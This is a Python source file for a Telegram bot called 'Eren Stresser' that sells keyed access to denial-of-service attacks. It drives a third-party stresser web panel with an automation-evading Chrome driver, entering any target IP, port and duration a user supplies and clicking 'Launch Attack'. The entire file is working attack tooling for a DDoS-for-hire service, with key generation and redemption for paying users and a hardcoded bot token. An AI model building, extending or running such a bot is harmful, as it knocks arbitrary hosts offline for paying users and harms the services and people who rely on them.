# stresser_bot.py
import asyncio
import logging
import sqlite3
import time
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ==================== CONFIG ====================
TOKEN = "8793284729:AAHHZ3HDQuXa8zOhde9GuJ8swcrWJcm4UWA"
ADMIN_IDS = [123456789, 84342238157]
DB_FILE = "bot_data.db"
PANEL_URL = "https://return.st/panel"

IP_SELECTOR = 'input[placeholder="70.70.70.70"]'
PORT_SELECTOR = 'input[type="number"][placeholder="80"]'
TIME_SELECTOR = 'input[type="number"][min="1"][max="60"]'
LAUNCH_BUTTON_SELECTOR = 'button.inline-flex.items-center.justify-center, button:contains("Launch Attack")'

DEFAULT_TIME = 60
MAX_TIME = 60
# ================================================

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Database
def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, registered_at TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER, created_at TEXT, used_by INTEGER DEFAULT NULL, used_at TEXT)''')
        conn.commit()

init_db()

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def generate_key(days: int) -> str:
    key = f"eren-{int(time.time())}-{days}d"
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("INSERT INTO keys (key, days, created_at) VALUES (?, ?, ?)",
                  (key, days, datetime.now().isoformat()))
        conn.commit()
    return key

def redeem_key(key: str, user_id: int) -> tuple[bool, str]:
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        c.execute("SELECT days, used_by FROM keys WHERE key = ?", (key,))
        row = c.fetchone()
        if not row:
            return False, "❌ Invalid key."
        days, used_by = row
        if used_by is not None:
            return False, "❌ Key already used."
        c.execute("UPDATE keys SET used_by = ?, used_at = ? WHERE key = ?",
                  (user_id, datetime.now().isoformat(), key))
        conn.commit()
    return True, f"✅ Key redeemed! Valid for {days} days."

# Selenium
driver = None
wait = None

def init_browser():
    global driver, wait
    try:
        options = uc.ChromeOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1280,900")

        driver = uc.Chrome(options=options, version_main=133)  # Change version if error
        wait = WebDriverWait(driver, 25)

        logger.info("🌐 Opening stresser panel...")
        driver.get(PANEL_URL)
        time.sleep(8)
        logger.info("✅ Browser & Panel Ready!")
    except Exception as e:
        logger.error(f"Browser failed: {e}")
        raise

async def send_attack(ip: str, port: str, seconds: int):
    global driver
    if driver is None:
        init_browser()

    try:
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, IP_SELECTOR))).clear()
        driver.find_element(By.CSS_SELECTOR, IP_SELECTOR).send_keys(ip)

        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, PORT_SELECTOR))).clear()
        driver.find_element(By.CSS_SELECTOR, PORT_SELECTOR).send_keys(port)

        if seconds > MAX_TIME: seconds = MAX_TIME
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, TIME_SELECTOR))).clear()
        driver.find_element(By.CSS_SELECTOR, TIME_SELECTOR).send_keys(str(seconds))

        btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, LAUNCH_BUTTON_SELECTOR)))
        btn.click()

        return True, f"✅ **Attack Started**\nTarget: `{ip}:{port}`\nDuration: {seconds}s"
    except Exception as e:
        return False, f"❌ Error: {str(e)}"

# ===================== COMMANDS =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to Eren Stresser!** 🚀\n\n"
        "Use `/eren <ip> <port> [time]` (Max 60s)", 
        parse_mode="Markdown"
    )

async def eren(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("❌ Usage: `/eren <ip> <port> [seconds]`", parse_mode="Markdown")
        return

    ip = args[0].strip()
    port = args[1].strip()
    seconds = int(args[2]) if len(args) >= 3 else DEFAULT_TIME
    if seconds > MAX_TIME: seconds = MAX_TIME
    if seconds < 10:
        await update.message.reply_text("❌ Minimum 10 seconds.")
        return

    msg = await update.message.reply_text("🔄 **Launching Attack...**", parse_mode="Markdown")
    success, result = await send_attack(ip, port, seconds)

    if success:
        await msg.edit_text(result, parse_mode="Markdown")
        await asyncio.sleep(seconds + 5)
        await update.message.reply_text(f"🏁 **Attack Finished** `{ip}:{port}`", parse_mode="Markdown")
    else:
        await msg.edit_text(result, parse_mode="Markdown")

# Add other commands (price, panel, genkey, redeem, etc.) if needed

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("eren", eren))
    
    print("🤖 Bot Started - Launching Chrome...")
    app.run_polling()

if __name__ == "__main__":
    main()
